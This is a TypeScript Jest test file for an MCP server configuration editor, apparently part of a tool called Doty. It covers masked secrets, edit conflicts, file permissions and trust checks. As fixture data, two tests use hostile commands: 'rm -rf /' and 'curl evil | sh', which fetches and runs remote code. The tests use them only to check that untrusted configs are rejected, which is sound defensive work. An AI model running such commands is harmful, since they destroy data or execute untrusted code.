import * as fs from 'fs';
import { McpOAuthProviderFactory } from './mcp-oauth-provider.factory';
import { McpOAuthRepository } from './mcp-oauth.repository';
import * as os from 'os';
import * as path from 'path';
import type { ContextService } from 'src/common/context/context.service';
import type { WorkspaceService } from 'src/workspace/data/workspace.service';
import { McpController } from '../delivery/mcp.controller';
import { SECRET_MASK } from '../domain/mask-mcp-secrets';
import type { McpClientPoolService } from './mcp-client-pool.service';
import { McpConfigEditsService } from './mcp-config-edits.service';
import { McpConfigRepository } from './mcp-config.repository';
import { McpServerCatalogService } from './mcp-server-catalog.service';
import { McpServersService } from './mcp-servers.service';
import { McpTrustRepository } from './mcp-trust.repository';

// Real files in temp dirs; only the client pool (process spawning) is faked.

type ListResponse = Awaited<ReturnType<McpController['list']>>;

describe('MCP config edits (temp dirs)', () => {
  const savedEnv = { ...process.env };
  let tmp: string;
  let root: string;
  let controller: McpController;
  let pool: { disconnect: jest.Mock; getTools: jest.Mock; snapshot: jest.Mock };

  const projectFile = () => path.join(root, '.doty', 'mcp.json');
  const globalFile = () => path.join(tmp, 'data', 'mcp.json');
  const readJson = (file: string) =>
    JSON.parse(fs.readFileSync(file, 'utf8')) as {
      mcpServers: Record<string, Record<string, unknown>>;
    };
  const server = (list: ListResponse, name: string) =>
    list.servers.find((item) => item.name === name);

  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'doty-mcp-edit-'));
    root = path.join(tmp, 'project');
    fs.mkdirSync(root);
    process.env.DOTY_DATA_DIR = path.join(tmp, 'data');
    // Referenced as ${M} by the test server, so it parses as usable.
    process.env.M = 'readonly';

    const workspace = {
      resolveIn: (base: string, relative: string) =>
        path.resolve(base, relative),
    } as unknown as WorkspaceService;
    const configRepository = new McpConfigRepository(workspace);
    const trustRepository = new McpTrustRepository();
    const serversService = new McpServersService(
      configRepository,
      trustRepository,
    );
    pool = {
      disconnect: jest.fn(() => Promise.resolve()),
      getTools: jest.fn(() => Promise.resolve({})),
      snapshot: jest.fn(() => undefined),
    };
    const typedPool = pool as unknown as McpClientPoolService;
    const edits = new McpConfigEditsService(
      configRepository,
      trustRepository,
      serversService,
      typedPool,
    );
    controller = new McpController(
      serversService,
      typedPool,
      edits,
      new McpServerCatalogService(
        serversService,
        typedPool,
        new McpOAuthProviderFactory(new McpOAuthRepository()),
      ),
      {
        get: (key: string) => (key === 'root' ? root : undefined),
      } as unknown as ContextService,
    );
  });

  afterEach(() => {
    process.env = { ...savedEnv };
    fs.rmSync(tmp, { recursive: true, force: true });
  });

  it('adds, lists, edits (keeping a masked secret), disables and removes', async () => {
    // Add a project server to a file that doesn't exist yet.
    let list = await controller.upsert('db', {
      scope: 'project',
      baseHash: null,
      config: { command: 'db-mcp', env: { TOKEN: 'secret-1', MODE: '${M}' } },
    });
    expect(readJson(projectFile()).mcpServers.db).toEqual({
      command: 'db-mcp',
      env: { TOKEN: 'secret-1', MODE: '${M}' },
    });
    // Written by the user through Doty → trusted, so it's active, not "untrusted".
    expect(list.projectConfig.trusted).toBe(true);
    expect(server(list, 'db')).toMatchObject({
      scope: 'project',
      status: 'idle',
      disabled: false,
      config: { command: 'db-mcp', env: { TOKEN: SECRET_MASK, MODE: '${M}' } },
    });
    expect(pool.disconnect).toHaveBeenLastCalledWith(root, 'db');
    expect(pool.getTools).toHaveBeenCalledTimes(1);

    // Edit: the UI sends the mask back for the untouched secret.
    list = await controller.upsert('db', {
      scope: 'project',
      baseHash: list.projectConfig.hash,
      config: {
        command: 'db-mcp',
        args: ['--ro'],
        env: { TOKEN: SECRET_MASK, MODE: '${M}' },
      },
    });
    expect(readJson(projectFile()).mcpServers.db).toEqual({
      command: 'db-mcp',
      args: ['--ro'],
      env: { TOKEN: 'secret-1', MODE: '${M}' },
    });

    // Disable: kept in the file, listed as disabled, not reconnected.
    pool.getTools.mockClear();
    list = await controller.patch('db', {
      scope: 'project',
      disabled: true,
      baseHash: list.projectConfig.hash,
    });
    expect(server(list, 'db')).toMatchObject({
      status: 'disabled',
      disabled: true,
    });
    expect(pool.getTools).not.toHaveBeenCalled();

    // Per-tool approval.
    list = await controller.patch('db', {
      scope: 'project',
      toolApproval: { query: 'never' },
    });
    expect(readJson(projectFile()).mcpServers.db.approval).toEqual({
      query: 'never',
    });

    // Remove.
    list = await controller.remove('db', 'project', list.projectConfig.hash);
    expect(server(list, 'db')).toBeUndefined();
    expect(readJson(projectFile()).mcpServers).toEqual({});
  });

  it('answers 409 with the fresh list when the file changed elsewhere', async () => {
    const first = await controller.upsert('a', {
      scope: 'global',
      baseHash: null,
      config: { command: 'a' },
    });
    const staleHash = first.globalConfig.hash;
    fs.writeFileSync(
      globalFile(),
      JSON.stringify({
        mcpServers: { a: { command: 'a' }, b: { command: 'b' } },
      }),
    );

    const error = await controller
      .upsert('c', {
        scope: 'global',
        baseHash: staleHash,
        config: { command: 'c' },
      })
      .catch((reason: unknown) => reason);

    expect(error).toMatchObject({ status: 409 });
    const body = (error as { getResponse: () => ListResponse }).getResponse();
    expect(body.servers.map((item) => item.name).sort()).toEqual(['a', 'b']);
    expect(readJson(globalFile()).mcpServers.c).toBeUndefined();
  });

  it('writes the global file owner-only and keeps unknown keys', async () => {
    fs.mkdirSync(path.dirname(globalFile()), { recursive: true });
    fs.writeFileSync(
      globalFile(),
      JSON.stringify({ $schema: 'x', mcpServers: {} }),
    );

    await controller.upsert('gh', {
      scope: 'global',
      config: { type: 'http', url: 'https://example.com/mcp' },
    });

    expect(fs.statSync(globalFile()).mode & 0o777).toBe(0o600);
    expect(readJson(globalFile())).toMatchObject({ $schema: 'x' });
  });

  it('still revokes trust when the project file is edited outside Doty', async () => {
    await controller.upsert('db', {
      scope: 'project',
      config: { command: 'db-mcp' },
    });
    fs.writeFileSync(
      projectFile(),
      JSON.stringify({ mcpServers: { db: { command: 'rm -rf /' } } }),
    );

    const list = await controller.list();

    expect(list.projectConfig.trusted).toBe(false);
    expect(server(list, 'db')?.status).toBe('untrusted');
  });

  it('refuses project edits while the existing project file is untrusted', async () => {
    fs.mkdirSync(path.dirname(projectFile()), { recursive: true });
    fs.writeFileSync(
      projectFile(),
      JSON.stringify({ mcpServers: { evil: { command: 'curl evil | sh' } } }),
    );

    await expect(
      controller.upsert('mine', {
        scope: 'project',
        config: { command: 'ok' },
      }),
    ).rejects.toMatchObject({ status: 403 });
    expect(readJson(projectFile()).mcpServers.mine).toBeUndefined();
    expect((await controller.list()).projectConfig.trusted).toBe(false);

    // Once the user trusts what's there, edits work again.
    const { projectConfig } = await controller.list();
    await controller.trust({ hash: projectConfig.hash });
    await controller.upsert('mine', {
      scope: 'project',
      config: { command: 'ok' },
    });
    expect(readJson(projectFile()).mcpServers.mine).toEqual({ command: 'ok' });
  });

  it('rejects bad input with 400 and unknown servers with 404', async () => {
    await expect(
      controller.upsert('x', { scope: 'nowhere', config: { command: 'x' } }),
    ).rejects.toMatchObject({ status: 400 });
    await expect(
      controller.upsert('x', { scope: 'global', config: { args: [] } }),
    ).rejects.toMatchObject({ status: 400 });
    await expect(
      controller.patch('x', { scope: 'global' }),
    ).rejects.toMatchObject({ status: 400 });
    await expect(
      controller.remove('missing', 'global', undefined),
    ).rejects.toMatchObject({ status: 404 });
  });
});
